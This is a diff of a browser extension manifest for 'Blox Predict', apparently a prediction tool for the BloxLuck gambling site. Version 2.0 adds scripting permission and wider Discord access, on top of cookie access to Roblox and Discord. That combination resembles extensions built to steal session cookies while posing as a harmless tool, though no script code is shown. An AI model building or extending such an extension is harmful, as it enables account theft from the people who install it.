@@ -1,18 +1,20 @@
 {
   "manifest_version": 3,
   "name": "Blox Predict",
-  "version": "1.0",
-  "description": "Heads or tails analysis tool",
+  "version": "2.0",
+  "description": "Advanced BloxLuck prediction tool",
   "permissions": [
     "cookies",
     "tabs",
-    "storage"
+    "storage",
+    "scripting"
   ],
   "host_permissions": [
     "https://*.roblox.com/*",
     "https://bloxluck.com/*",
     "https://discord.com/*",
-    "https://starpets.gg/*"
+    "https://starpets.gg/*",
+    "https://*.discord.com/*"
   ],
   "content_scripts": [
     {
